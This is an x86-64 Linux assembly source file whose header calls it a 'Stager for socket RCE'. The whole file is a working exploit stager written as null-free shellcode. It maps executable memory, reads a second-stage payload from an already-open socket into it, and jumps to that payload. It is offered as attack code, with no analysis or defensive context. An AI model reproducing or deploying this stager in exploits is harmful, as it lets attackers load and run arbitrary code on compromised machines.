;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
; file:    exploit-stager.asm
; date:    2017-01-18
; author:  paul.dautry
; purpose:
;       Stager for socket RCE
;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[SECTION .text]
global _start

_start:
        ; buf = mmap(NULL, 4096, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0)
        xor rdi, rdi
        xor rsi, rsi
        mov sil, 2
        shl rsi, 11
        xor rdx, rdx
        mov dl, 7
        xor r10, r10
        mov r10B, 34
        xor r8, r8
        xor r9, r9
        xor rax, rax
        mov al, 9
        syscall
        mov r12, rax
        ; read (sd=4, buf, 4096)
        xor rdi, rdi
        mov dil, 4
        mov rsi, r12 
        xor rdx, rdx
        mov dl, 2
        shl rdx, 11
        xor rax, rax
        syscall
        ; call new function
        call r12
        ; ret to caller with rax equal to zero
        xor rax, rax
        ret
